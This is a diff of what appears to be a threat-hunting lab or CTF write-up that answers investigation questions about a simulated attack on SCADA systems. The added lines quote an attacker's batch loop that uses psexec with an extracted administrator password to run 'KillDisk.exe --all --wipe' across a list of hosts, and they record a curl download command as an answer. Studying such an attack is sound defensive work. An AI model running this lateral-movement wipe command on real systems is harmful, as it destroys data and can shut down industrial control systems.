@@ -52,14 +52,25 @@ From previous query.<br><br>
 **Answer: 9/9/2024, 11:17:44 AM**<br><br>
 
 **Q7. What command was used to download this file?**<br><br>
+Query from question 4.<br><br>
 
-**Answer: **<br><br>
+**Answer: curl -o C:\ProgramData\SCADA_Malicious_Commands.txt **<br><br>
 
-**Q. **<br><br>
+**Q8. A destructive tool was used to wipe data and cause the SCADA systems to shut down. 🫨 What is the name of the executable that was used to do this?**<br><br>
+The last result from the query from question 4.<br><br>
 
-**Answer: **<br><br>
+```
+for /F 'tokens=1' %i in (C:\\ProgramData
+\\SCADA_IPs.txt) do (
+  set /p password=<C:\\ProgramData\\Extracted_Password.txt
+  psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe"
+)
+```
+<br>
 
-**Q. **<br><br>
+**Answer: KillDisk.exe**<br><br>
+
+**Q9. What legitimate Windows tool was exploited to carry out these remote executions?**<br><br>
 
 **Answer: **<br><br>
 
